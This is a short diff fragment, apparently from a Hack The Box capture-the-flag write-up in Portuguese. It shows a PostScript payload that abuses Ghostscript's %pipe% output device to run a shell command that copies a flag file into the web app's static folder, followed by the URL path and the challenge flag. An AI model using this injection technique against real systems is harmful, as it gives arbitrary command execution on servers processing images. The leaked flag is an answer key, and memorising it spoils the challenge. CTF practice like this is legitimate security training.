@@ -12,3 +12,8 @@ legal
 { legal } stopped { pop } if
 restore
 mark /OutputFile (%pipe%cat flag >> /app/application/static/petpets/flag.txt) currentdevice putdeviceprops
+
+agora é só ir pro diretório:
+http://URL:PORT/static/petpets/flag.txt
+
+HTB{c0mfy_bzzzzz_rcb33s_v1b3s}
